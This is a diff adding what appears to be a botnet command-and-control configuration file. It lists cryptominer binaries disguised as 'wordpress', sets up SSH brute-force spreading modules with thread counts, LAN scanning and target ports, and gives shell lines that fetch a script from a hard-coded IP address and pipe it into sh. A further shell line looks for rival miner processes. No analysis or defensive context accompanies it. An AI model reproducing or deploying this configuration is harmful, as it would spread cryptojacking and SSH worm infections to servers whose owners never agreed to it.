@@ -1,0 +1,65 @@
+{
+    "Data": {
+        "CfgVer": 65,
+        "Config": {
+            "Interval": "60s"
+        },
+        "Miner": [{
+                "Exe": "/usr/local/bin/wordpress",
+                "Md5": "d146612bed765ba32200e0f97d0330c8",
+                "Url": "/static/wordpress"
+            },
+            {
+                "Exe": "/usr/bin/wordpress",
+                "Md5": "d146612bed765ba32200e0f97d0330c8",
+                "Url": "/static/wordpress"
+            }
+        ],
+        "Cmd": {
+            "AALocalSSH": {
+                "Id": 3035,
+                "Version": 5023,
+                "UrlPath": "/static/5023/ddgs",
+                "Timeout": "1m"
+            },
+            "AAssh": {
+                "Id": 2147,
+                "Version": 5023,
+                "UrlPath": "/static/5023/ddgs",
+                "NThreads": 100,
+                "Duration": "480h",
+                "IPDuration": "12h",
+                "GenLan": True,
+                "GenAAA": False,
+                "Timeout": "1m",
+                "Ports": [
+                    22,
+                    1987,
+                    2222,
+                    22222,
+                    12222
+                ]
+            },
+            "Sh": [{
+                    "Id": 952,
+                    "Version": 4005,
+                    "Line": "(curl -fsSL http://67.205.168.20:8000/i.sh||wget -q -O- http://67.205.168.20:8000/i.sh) | sh",
+                    "Timeout": "120s"
+                },
+                {
+                    "Id": 953,
+                    "Version": 5018,
+                    "Line": "(curl -fsSL http://67.205.168.20:8000/i.sh||wget -q -O- http://67.205.168.20:8000/i.sh) | sh",
+                    "Timeout": "120s"
+                },
+                {
+                    "Id": 951,
+                    "Version": -1,
+                    "Line": "ps auxf|grep -v grep|grep \"\\(Trump\\|Macron\\|hwloc\\|Italia\\)\"",
+                    "Timeout": "120s"
+                }
+            ]
+        }
+    },
+    "Signature": "\x69\x7C\xFC\x47\x1C\x41\x63\x04\x1A\x34\xF3\x64\xBF\x0D\xEB\x71\xBB\xEC\x37\x9E\x2B\xE8\xAB\x45\xCC\x25\x59\xDA\x95\xB2\x3B\x88\xCA\x58\x40\x84\x30\x2A\x13\x59\xB5\x50\x4F\xDF\x59\x6E\x18\xEF\x22\x2D\x89\x6A\xC0\x9C\xA6\xC4\x77\x8D\xC0\xBA\x9B\xC2\x90\xBA\x84\x70\xFE\xEB\xC3\xE5\xE7\x54\xD6\x17\x6B\xFF\x1A\x28\xD6\x56\xAF\x25\xAB\xFA\x45\xE1\x9C\x89\x52\x3E\x2D\xC2\xC7\x29\x5C\xC0\x48\x2D\x3E\x40\x6D\xFA\x4C\xD7\x26\x28\x56\x1D\xE2\xD6\x44\x20\x74\xCF\xBC\x95\xCF\xA9\x93\xCE\xFB\x23\x73\xD9\x56\x03\x79\x15\x08\xF7\xD3\x63\xC4\x67\x15\xB0\x0F\x61\x92\x0F\x4C\x00\x14\x90\x01\xF4\x7E\xFD\x87\x9B\x91\xEE\xB0\x17\xA0\x4E\xBE\x79\xE8\xEC\x4C\x78\xB4\x72\x58\x80\x46\xB0\xC2\xE2\x5B\x50\x88\x57\xE4\x46\xA4\xD9\xEC\x33\x48\x9A\x75\x77\xB4\xB0\x04\x55\xA8\x16\xD6\x9A\xD0\xA8\xAF\xCB\xD7\xE2\x15\x34\x37\xAB\xF3\x1B\x1F\x1E\x8E\x5C\xBD\x8A\xB1\xB9\xC2\x4F\x0E\xBA\x60\xD9\x46\xED\x21\x75\xF3\x75\x7F\x8A\x04\x12\xBE\x4C\x88\x04\x5E\xBC\xDC\x9F\x02\x2C\x6C\x61\xE1\xC5\xFF\xD7\x44\xEE\x0D\x93\xAE\x28\x2D\x80\xED\x16\x14\xC7"
+}
